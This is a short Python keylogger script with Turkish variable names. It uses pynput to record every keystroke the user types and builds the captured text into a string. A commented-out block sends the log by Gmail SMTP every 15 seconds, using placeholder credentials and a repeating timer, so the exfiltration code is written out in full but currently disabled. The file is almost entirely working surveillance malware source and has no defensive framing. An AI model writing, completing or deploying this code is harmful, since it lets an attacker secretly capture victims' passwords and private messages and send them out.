import pynput.keyboard
import smtplib
import threading


toplama = " "
def emir(harfler):
    global toplama
    print("========================")
    try:

        toplama += str(harfler.char)
    
    except AttributeError:
        
        if harfler == harfler.space:
            toplama += " "  
        
        elif harfler==harfler.backspace:
            sayi = len(toplama)
            sayi -=1
            print(toplama[sayi])
            deger=0
            sonuc=" "
           
            while sayi>deger:
                sonuc += toplama[deger]
                deger +=1
            toplama = sonuc
        
        elif harfler==harfler.enter:
            toplama += "\n"
        
        elif harfler==harfler.tab:
            toplama += "\t"

        elif harfler==harfler.shift:
            toplama += " "

        else:
            toplama +=str(harfler)
    print(toplama)

# def mail_gonder(mesaj):
#    global toplama
 #   server = smtplib.SMTP("smtp.gmail.com:587")
 #   server.starttls()
  #  server.login("EPOSTA","SIFRE")
  #  server.sendmail("EPOSTA","EPOSTA",mesaj)
  #  server.quit()

#def dallama():
 #   global toplama
  #  if toplama:
 #       mail_gonder(toplama)
  #  toplama=""
  #  timer = threading.Timer(15,dallama)
  #  timer.start()


dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
#    dallama()
    dinleme.join()


